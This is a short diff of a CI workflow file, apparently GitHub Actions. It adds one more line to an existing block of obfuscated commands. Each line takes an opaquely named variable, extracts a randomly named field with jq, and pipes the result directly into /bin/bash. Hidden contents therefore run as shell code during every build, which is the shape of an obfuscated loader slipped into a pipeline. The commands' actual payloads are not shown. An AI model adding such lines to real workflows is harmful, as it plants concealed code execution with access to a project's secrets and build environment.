@@ -27,6 +27,7 @@ jobs:
           echo $r13971 | jq -r .rokuw37 | /bin/bash
           printf '%s' "$mhj42787" | jq -r .gb8 | /bin/bash
           echo $soj4807 | jq -r .ibi32231 | /bin/bash
+          echo $bg0 | jq -r .wzm77 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
